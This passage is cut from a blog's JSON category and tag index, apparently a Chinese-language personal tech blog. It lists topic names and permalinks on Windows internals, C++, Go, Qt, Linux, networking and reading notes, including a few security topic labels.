Studio","slug":"A-OS/Windows/Visual-Studio","permalink":"http://example.com/categories/A-OS/Windows/Visual-Studio/"},{"name":"E_手册","slug":"E-手册","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"个人配置","slug":"E-手册/个人配置","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/%E4%B8%AA%E4%BA%BA%E9%85%8D%E7%BD%AE/"},{"name":"COM","slug":"A-OS/Windows/COM","permalink":"http://example.com/categories/A-OS/Windows/COM/"},{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"CSharp","slug":"B-Code/CSharp","permalink":"http://example.com/categories/B-Code/CSharp/"},{"name":"G_工具","slug":"G-工具","permalink":"http://example.com/categories/G-%E5%B7%A5%E5%85%B7/"},{"name":"批处理","slug":"A-OS/Windows/批处理","permalink":"http://example.com/categories/A-OS/Windows/%E6%89%B9%E5%A4%84%E7%90%86/"},{"name":"Shell扩展","slug":"A-OS/Windows/Shell扩展","permalink":"http://example.com/categories/A-OS/Windows/Shell%E6%89%A9%E5%B1%95/"},{"name":"Python","slug":"B-Code/Python","permalink":"http://example.com/categories/B-Code/Python/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"http://example.com/categories/A-OS/Windows/API/"},{"name":"cmd","slug":"A-OS/Windows/cmd","permalink":"http://example.com/categories/A-OS/Windows/cmd/"},{"name":"Exchange","slug":"A-OS/Windows/Exchange","permalink":"http://example.com/categories/A-OS/Windows/Exchange/"},{"name":"C","slug":"B-Code/C","permalink":"http://example.com/categories/B-Code/C/"},{"name":"异常及错误处理","slug":"A-OS/Windows/异常及错误处理","permalink":"http://example.com/categories/A-OS/Windows/%E5%BC%82%E5%B8%B8%E5%8F%8A%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86/"},{"name":"环境搭建","slug":"A-OS/Windows/环境搭建","permalink":"http://example.com/categories/A-OS/Windows/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"name":"权限与会话","slug":"A-OS/Windows/权限与会话","permalink":"http://example.com/categories/A-OS/Windows/%E6%9D%83%E9%99%90%E4%B8%8E%E4%BC%9A%E8%AF%9D/"},{"name":"服务","slug":"A-OS/Windows/服务","permalink":"http://example.com/categories/A-OS/Windows/%E6%9C%8D%E5%8A%A1/"},{"name":"组策略","slug":"A-OS/Windows/组策略","permalink":"http://example.com/categories/A-OS/Windows/%E7%BB%84%E7%AD%96%E7%95%A5/"},{"name":"安全设置","slug":"A-OS/Windows/组策略/安全设置","permalink":"http://example.com/categories/A-OS/Windows/%E7%BB%84%E7%AD%96%E7%95%A5/%E5%AE%89%E5%85%A8%E8%AE%BE%E7%BD%AE/"},{"name":"账户策略","slug":"A-OS/Windows/组策略/安全设置/账户策略","permalink":"http://example.com/categories/A-OS/Windows/%E7%BB%84%E7%AD%96%E7%95%A5/%E5%AE%89%E5%85%A8%E8%AE%BE%E7%BD%AE/%E8%B4%A6%E6%88%B7%E7%AD%96%E7%95%A5/"},{"name":"CreateRemoteThread","slug":"A-OS/Windows/API/CreateRemoteThread","permalink":"http://example.com/categories/A-OS/Windows/API/CreateRemoteThread/"},{"name":"AD","slug":"A-OS/Windows/AD","permalink":"http://example.com/categories/A-OS/Windows/AD/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"http://example.com/categories/A-OS/Linux/"},{"name":"Linux防火墙","slug":"A-OS/Linux/Linux防火墙","permalink":"http://example.com/categories/A-OS/Linux/Linux%E9%98%B2%E7%81%AB%E5%A2%99/"},{"name":"多线程","slug":"A-OS/Windows/多线程","permalink":"http://example.com/categories/A-OS/Windows/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"name":"开发相关","slug":"A-OS/Windows/开发相关","permalink":"http://example.com/categories/A-OS/Windows/%E5%BC%80%E5%8F%91%E7%9B%B8%E5%85%B3/"},{"name":"Linux操作系统原理剖析","slug":"A-OS/Linux/Linux操作系统原理剖析","permalink":"http://example.com/categories/A-OS/Linux/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90/"},{"name":"B_设计模式","slug":"A-内功/B-设计模式","permalink":"http://example.com/categories/A-%E5%86%85%E5%8A%9F/B-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"RPC","slug":"A-OS/Windows/RPC","permalink":"http://example.com/categories/A-OS/Windows/RPC/"},{"name":"汇编","slug":"B-Code/汇编","permalink":"http://example.com/categories/B-Code/%E6%B1%87%E7%BC%96/"},{"name":"Z_杂记","slug":"Z-杂记","permalink":"http://example.com/categories/Z-%E6%9D%82%E8%AE%B0/"},{"name":"osquery","slug":"G-工具/osquery","permalink":"http://example.com/categories/G-%E5%B7%A5%E5%85%B7/osquery/"},{"name":"OpenSSL","slug":"G-工具/OpenSSL","permalink":"http://example.com/categories/G-%E5%B7%A5%E5%85%B7/OpenSSL/"},{"name":"G_LeetCode","slug":"G-LeetCode","permalink":"http://example.com/categories/G-LeetCode/"},{"name":"F_攻防","slug":"F-攻防","permalink":"http://example.com/categories/F-%E6%94%BB%E9%98%B2/"},{"name":"脚本","slug":"E-手册/脚本","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/%E8%84%9A%E6%9C%AC/"},{"name":"快捷键整理","slug":"E-手册/快捷键整理","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/%E5%BF%AB%E6%8D%B7%E9%94%AE%E6%95%B4%E7%90%86/"},{"name":"UML","slug":"E-手册/UML","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/UML/"},{"name":"Git","slug":"E-手册/Git","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/Git/"},{"name":"Game","slug":"E-手册/Game","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/Game/"},{"name":"En","slug":"E-手册/En","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/En/"},{"name":"Curl","slug":"E-手册/Curl","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/Curl/"},{"name":"D_立志博览群书","slug":"D-立志博览群书","permalink":"http://example.com/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"《计算机网络 第7版》","slug":"D-立志博览群书/《计算机网络-第7版》","permalink":"http://example.com/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%AC%AC7%E7%89%88%E3%80%8B/"},{"name":"第7章 网络安全","slug":"D-立志博览群书/《计算机网络-第7版》/第7章-网络安全","permalink":"http://example.com/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%AC%AC7%E7%89%88%E3%80%8B/%E7%AC%AC7%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"《深入理解Windows操作系统》","slug":"D-立志博览群书/《深入理解Windows操作系统》","permalink":"http://example.com/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8A%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%8B/"},{"name":"《Windows核心编程》","slug":"D-立志博览群书/《Windows核心编程》","permalink":"http://example.com/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8AWindows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B%E3%80%8B/"},{"name":"《Linux命令行与shell脚本编程大全.第3版》","slug":"D-立志博览群书/《Linux命令行与shell脚本编程大全-第3版》","permalink":"http://example.com/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8ALinux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8Eshell%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B%E5%A4%A7%E5%85%A8-%E7%AC%AC3%E7%89%88%E3%80%8B/"},{"name":"《Efficient C++》","slug":"D-立志博览群书/《Efficient-C-》","permalink":"http://example.com/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8AEfficient-C-%E3%80%8B/"},{"name":"《C++ primer plus》","slug":"D-立志博览群书/《C-primer-plus》","permalink":"http://example.com/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8AC-primer-plus%E3%80%8B/"},{"name":"第11章 使用类","slug":"D-立志博览群书/《C-primer-plus》/第11章-使用类","permalink":"http://example.com/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8AC-primer-plus%E3%80%8B/%E7%AC%AC11%E7%AB%A0-%E4%BD%BF%E7%94%A8%E7%B1%BB/"},{"name":"libevent","slug":"C-OpenSource/libevent","permalink":"http://example.com/categories/C-OpenSource/libevent/"},{"name":"OpenSSL","slug":"C-OpenSource/OpenSSL","permalink":"http://example.com/categories/C-OpenSource/OpenSSL/"},{"name":"MySQL","slug":"C-OpenSource/MySQL","permalink":"http://example.com/categories/C-OpenSource/MySQL/"},{"name":"API","slug":"C-OpenSource/API","permalink":"http://example.com/categories/C-OpenSource/API/"},{"name":"网络编程","slug":"B-Code/网络编程","permalink":"http://example.com/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"抓包","slug":"B-Code/网络编程/抓包","permalink":"http://example.com/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/%E6%8A%93%E5%8C%85/"},{"name":"tcp","slug":"B-Code/网络编程/tcp","permalink":"http://example.com/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/tcp/"},{"name":"libevent","slug":"B-Code/网络编程/libevent","permalink":"http://example.com/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/libevent/"},{"name":"DNS","slug":"B-Code/网络编程/DNS","permalink":"http://example.com/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/DNS/"},{"name":"正则表达式","slug":"B-Code/正则表达式","permalink":"http://example.com/categories/B-Code/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"name":"数据库","slug":"B-Code/数据库","permalink":"http://example.com/categories/B-Code/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"MYSQL","slug":"B-Code/数据库/MYSQL","permalink":"http://example.com/categories/B-Code/%E6%95%B0%E6%8D%AE%E5%BA%93/MYSQL/"},{"name":"TypeScript","slug":"B-Code/TypeScript","permalink":"http://example.com/categories/B-Code/TypeScript/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"},{"name":"鼠标键盘","slug":"B-Code/Qt/鼠标键盘","permalink":"http://example.com/categories/B-Code/Qt/%E9%BC%A0%E6%A0%87%E9%94%AE%E7%9B%98/"},{"name":"动画","slug":"B-Code/Qt/动画","permalink":"http://example.com/categories/B-Code/Qt/%E5%8A%A8%E7%94%BB/"},{"name":"内存","slug":"B-Code/Qt/内存","permalink":"http://example.com/categories/B-Code/Qt/%E5%86%85%E5%AD%98/"},{"name":"Qt开发经验","slug":"B-Code/Qt/Qt开发经验","permalink":"http://example.com/categories/B-Code/Qt/Qt%E5%BC%80%E5%8F%91%E7%BB%8F%E9%AA%8C/"},{"name":"QWin","slug":"B-Code/Qt/QWin","permalink":"http://example.com/categories/B-Code/Qt/QWin/"},{"name":"QWebEngineView","slug":"B-Code/Qt/QWebEngineView","permalink":"http://example.com/categories/B-Code/Qt/QWebEngineView/"},{"name":"QTableWidget","slug":"B-Code/Qt/QTableWidget","permalink":"http://example.com/categories/B-Code/Qt/QTableWidget/"},{"name":"QLineEdit","slug":"B-Code/Qt/QLineEdit","permalink":"http://example.com/categories/B-Code/Qt/QLineEdit/"},{"name":"LeetCode","slug":"B-Code/LeetCode","permalink":"http://example.com/categories/B-Code/LeetCode/"},{"name":"IPC","slug":"B-Code/IPC","permalink":"http://example.com/categories/B-Code/IPC/"},{"name":"GO","slug":"B-Code/GO","permalink":"http://example.com/categories/B-Code/GO/"},{"name":"wailsapp","slug":"B-Code/GO/wailsapp","permalink":"http://example.com/categories/B-Code/GO/wailsapp/"},{"name":"todo","slug":"B-Code/GO/wailsapp/todo","permalink":"http://example.com/categories/B-Code/GO/wailsapp/todo/"},{"name":"Go简明手册","slug":"B-Code/GO/Go简明手册","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"面向对象编程","slug":"B-Code/GO/Go简明手册/面向对象编程","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/"},{"name":"面向对象编程","slug":"B-Code/GO/Go简明手册/面向对象编程/面向对象编程","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/"},{"name":"组合","slug":"B-Code/GO/Go简明手册/面向对象编程/组合","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/%E7%BB%84%E5%90%88/"},{"name":"方法","slug":"B-Code/GO/Go简明手册/面向对象编程/方法","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/%E6%96%B9%E6%B3%95/"},{"name":"接口变量值的类型","slug":"B-Code/GO/Go简明手册/面向对象编程/接口变量值的类型","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/%E6%8E%A5%E5%8F%A3%E5%8F%98%E9%87%8F%E5%80%BC%E7%9A%84%E7%B1%BB%E5%9E%8B/"},{"name":"接口","slug":"B-Code/GO/Go简明手册/面向对象编程/接口","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/%E6%8E%A5%E5%8F%A3/"},{"name":"嵌入interface","slug":"B-Code/GO/Go简明手册/面向对象编程/嵌入interface","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/%E5%B5%8C%E5%85%A5interface/"},{"name":"词频统计综合案例","slug":"B-Code/GO/Go简明手册/词频统计综合案例","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E8%AF%8D%E9%A2%91%E7%BB%9F%E8%AE%A1%E7%BB%BC%E5%90%88%E6%A1%88%E4%BE%8B/"},{"name":"并发与并行","slug":"B-Code/GO/Go简明手册/并发与并行","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E5%B9%B6%E5%8F%91%E4%B8%8E%E5%B9%B6%E8%A1%8C/"},{"name":"超时机制","slug":"B-Code/GO/Go简明手册/并发与并行/超时机制","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E5%B9%B6%E5%8F%91%E4%B8%8E%E5%B9%B6%E8%A1%8C/%E8%B6%85%E6%97%B6%E6%9C%BA%E5%88%B6/"},{"name":"select","slug":"B-Code/GO/Go简明手册/并发与并行/select","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E5%B9%B6%E5%8F%91%E4%B8%8E%E5%B9%B6%E8%A1%8C/select/"},{"name":"goroutine","slug":"B-Code/GO/Go简明手册/并发与并行/goroutine","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E5%B9%B6%E5%8F%91%E4%B8%8E%E5%B9%B6%E8%A1%8C/goroutine/"},{"name":"channel","slug":"B-Code/GO/Go简明手册/并发与并行/channel","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E5%B9%B6%E5%8F%91%E4%B8%8E%E5%B9%B6%E8%A1%8C/channel/"},{"name":"Go语言顺序编程","slug":"B-Code/GO/Go简明手册/Go语言顺序编程","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E9%A1%BA%E5%BA%8F%E7%BC%96%E7%A8%8B/"},{"name":"错误处理","slug":"B-Code/GO/Go简明手册/Go语言顺序编程/错误处理","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E9%A1%BA%E5%BA%8F%E7%BC%96%E7%A8%8B/%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86/"},{"name":"流程控制","slug":"B-Code/GO/Go简明手册/Go语言顺序编程/流程控制","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E9%A1%BA%E5%BA%8F%E7%BC%96%E7%A8%8B/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/"},{"name":"类型转换","slug":"B-Code/GO/Go简明手册/Go语言顺序编程/类型转换","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E9%A1%BA%E5%BA%8F%E7%BC%96%E7%A8%8B/%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/"},{"name":"函数的多返回值","slug":"B-Code/GO/Go简明手册/Go语言顺序编程/函数的多返回值","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E9%A1%BA%E5%BA%8F%E7%BC%96%E7%A8%8B/%E5%87%BD%E6%95%B0%E7%9A%84%E5%A4%9A%E8%BF%94%E5%9B%9E%E5%80%BC/"},{"name":"switch语句","slug":"B-Code/GO/Go简明手册/Go语言顺序编程/switch语句","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E9%A1%BA%E5%BA%8F%E7%BC%96%E7%A8%8B/switch%E8%AF%AD%E5%8F%A5/"},{"name":"panic和defer","slug":"B-Code/GO/Go简明手册/Go语言顺序编程/panic和defer","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E9%A1%BA%E5%BA%8F%E7%BC%96%E7%A8%8B/panic%E5%92%8Cdefer/"},{"name":"Go语言基础","slug":"B-Code/GO/Go简明手册/Go语言基础","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/"},{"name":"格式化字符串","slug":"B-Code/GO/Go简明手册/Go语言基础/格式化字符串","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"name":"字符类型","slug":"B-Code/GO/Go简明手册/Go语言基础/字符类型","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/%E5%AD%97%E7%AC%A6%E7%B1%BB%E5%9E%8B/"},{"name":"字符串","slug":"B-Code/GO/Go简明手册/Go语言基础/字符串","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"name":"切片","slug":"B-Code/GO/Go简明手册/Go语言基础/切片","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/%E5%88%87%E7%89%87/"},{"name":"package","slug":"B-Code/GO/Go简明手册/Go语言基础/package","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/package/"},{"name":"Go开发经验","slug":"B-Code/GO/Go开发经验","permalink":"http://example.com/categories/B-Code/GO/Go%E5%BC%80%E5%8F%91%E7%BB%8F%E9%AA%8C/"},{"name":"Duilib","slug":"B-Code/Duilib","permalink":"http://example.com/categories/B-Code/Duilib/"},{"name":"CPP","slug":"B-Code/CPP","permalink":"http://example.com/categories/B-Code/CPP/"},{"name":"std","slug":"B-Code/CPP/std","permalink":"http://example.com/categories/B-Code/CPP/std/"},{"name":"STL","slug":"B-Code/CPP/STL","permalink":"http://example.com/categories/B-Code/CPP/STL/"},{"name":"thread","slug":"B-Code/CPP/STL/thread","permalink":"http://example.com/categories/B-Code/CPP/STL/thread/"},{"name":"正则表达式","slug":"B-Code/C/正则表达式","permalink":"http://example.com/categories/B-Code/C/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"name":"驱动","slug":"A-OS/Windows/驱动","permalink":"http://example.com/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/"},{"name":"windows驱动开发教程","slug":"A-OS/Windows/驱动/windows驱动开发教程","permalink":"http://example.com/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/windows%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91%E6%95%99%E7%A8%8B/"},{"name":"EasyDriver","slug":"A-OS/Windows/驱动/EasyDriver","permalink":"http://example.com/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/EasyDriver/"},{"name":"网络helper","slug":"A-OS/Windows/网络helper","permalink":"http://example.com/categories/A-OS/Windows/%E7%BD%91%E7%BB%9Chelper/"},{"name":"查询系统信息","slug":"A-OS/Windows/查询系统信息","permalink":"http://example.com/categories/A-OS/Windows/%E6%9F%A5%E8%AF%A2%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF/"},{"name":"工具","slug":"A-OS/Windows/工具","permalink":"http://example.com/categories/A-OS/Windows/%E5%B7%A5%E5%85%B7/"},{"name":"内存泄漏","slug":"A-OS/Windows/内存泄漏","permalink":"http://example.com/categories/A-OS/Windows/%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F/"},{"name":"实战","slug":"A-OS/Windows/内存泄漏/实战","permalink":"http://example.com/categories/A-OS/Windows/%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F/%E5%AE%9E%E6%88%98/"},{"name":"WinUser","slug":"A-OS/Windows/WinUser","permalink":"http://example.com/categories/A-OS/Windows/WinUser/"},{"name":"WMI","slug":"A-OS/Windows/WMI","permalink":"http://example.com/categories/A-OS/Windows/WMI/"},{"name":"ShellCode","slug":"A-OS/Windows/ShellCode","permalink":"http://example.com/categories/A-OS/Windows/ShellCode/"},{"name":"IPC","slug":"A-OS/Windows/IPC","permalink":"http://example.com/categories/A-OS/Windows/IPC/"},{"name":"GetLastError","slug":"A-OS/Windows/GetLastError","permalink":"http://example.com/categories/A-OS/Windows/GetLastError/"},{"name":"Mac","slug":"A-OS/Mac","permalink":"http://example.com/categories/A-OS/Mac/"},{"name":"操作系统及Linux内核","slug":"A-OS/Linux/操作系统及Linux内核","permalink":"http://example.com/categories/A-OS/Linux/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8F%8ALinux%E5%86%85%E6%A0%B8/"},{"name":"RPC","slug":"A-OS/Linux/RPC","permalink":"http://example.com/categories/A-OS/Linux/RPC/"},{"name":"Linux基础入门","slug":"A-OS/Linux/Linux基础入门","permalink":"http://example.com/categories/A-OS/Linux/Linux%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"},{"name":"Linux内核分析配套实验","slug":"A-OS/Linux/Linux内核分析配套实验","permalink":"http://example.com/categories/A-OS/Linux/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/"},{"name":"Command&Tools","slug":"A-OS/Linux/Command-Tools","permalink":"http://example.com/categories/A-OS/Linux/Command-Tools/"},{"name":"diary","slug":"diary","permalink":"http://example.com/categories/diary/"}],"tags":[{"name":"OpenSource","slug":"OpenSource","permalink":"http://example.com/tags/OpenSource/"},{"name":"mimikatz","slug":"mimikatz","permalink":"http://example.com/tags/mimikatz/"},{"name":"Visual Studio","slug":"Visual-Studio","permalink":"http://example.com/tags/Visual-Studio/"},{"name":"POC","slug":"POC","permalink":"http://example.com/tags/POC/"},{"name":"手册","slug":"手册","permalink":"http://example.com/tags/%E6%89%8B%E5%86%8C/"},{"name":"COM","slug":"COM","permalink":"http://example.com/tags/COM/"},{"name":"漏洞","slug":"漏洞","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E/"},{"name":".Net","slug":"Net","permalink":"http://example.com/tags/Net/"},{"name":"工具","slug":"工具","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7/"},{"name":"Windows","slug":"Windows","permalink":"http://example.com/tags/Windows/"},{"name":"DeskBand","slug":"DeskBand","permalink":"http://example.com/tags/DeskBand/"},{"name":"C#","slug":"C","permalink":"http://example.com/tags/C/"},{"name":"win","slug":"win","permalink":"http://example.com/tags/win/"},{"name":"驱动器","slug":"驱动器","permalink":"http://example.com/tags/%E9%A9%B1%E5%8A%A8%E5%99%A8/"},{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"令牌","slug":"令牌","permalink":"http://example.com/tags/%E4%BB%A4%E7%89%8C/"},{"name":"token","slug":"token","permalink":"http://example.com/tags/token/"},{"name":"RPC","slug":"RPC","permalink":"http://example.com/tags/RPC/"},{"name":"调试","slug":"调试","permalink":"http://example.com/tags/%E8%B0%83%E8%AF%95/"},{"name":"系统服务","slug":"系统服务","permalink":"http://example.com/tags/%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/"},{"name":"服务","slug":"服务","permalink":"http://example.com/tags/%E6%9C%8D%E5%8A%A1/"},{"name":"环境搭建","slug":"环境搭建","permalink":"http://example.com/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"name":"exchange","slug":"exchange","permalink":"http://example.com/tags/exchange/"},{"name":"AD","slug":"AD","permalink":"http://example.com/tags/AD/"},{"name":"powershell","slug":"powershell","permalink":"http://example.com/tags/powershell/"},{"name":"用户","slug":"用户","permalink":"http://example.com/tags/%E7%94%A8%E6%88%B7/"},{"name":"WQL","slug":"WQL","permalink":"http://example.com/tags/WQL/"},{"name":"WMI","slug":"WMI","permalink":"http://example.com/tags/WMI/"},{"name":"API","slug":"API","permalink":"http://example.com/tags/API/"},{"name":"winapi","slug":"winapi","permalink":"http://example.com/tags/winapi/"},{"name":"域","slug":"域","permalink":"http://example.com/tags/%E5%9F%9F/"},{"name":"多线程","slug":"多线程","permalink":"http://example.com/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"name":"lib","slug":"lib","permalink":"http://example.com/tags/lib/"},{"name":"dumpbin","slug":"dumpbin","permalink":"http://example.com/tags/dumpbin/"},{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"},{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"},{"name":"设计模式","slug":"设计模式","permalink":"http://example.com/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"创建型模式","slug":"创建型模式","permalink":"http://example.com/tags/%E5%88%9B%E5%BB%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/"},{"name":"《Linux操作系统原理剖析》","slug":"《Linux操作系统原理剖析》","permalink":"http://example.com/tags/%E3%80%8ALinux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90%E3%80%8B/"},{"name":"ALPC","slug":"ALPC",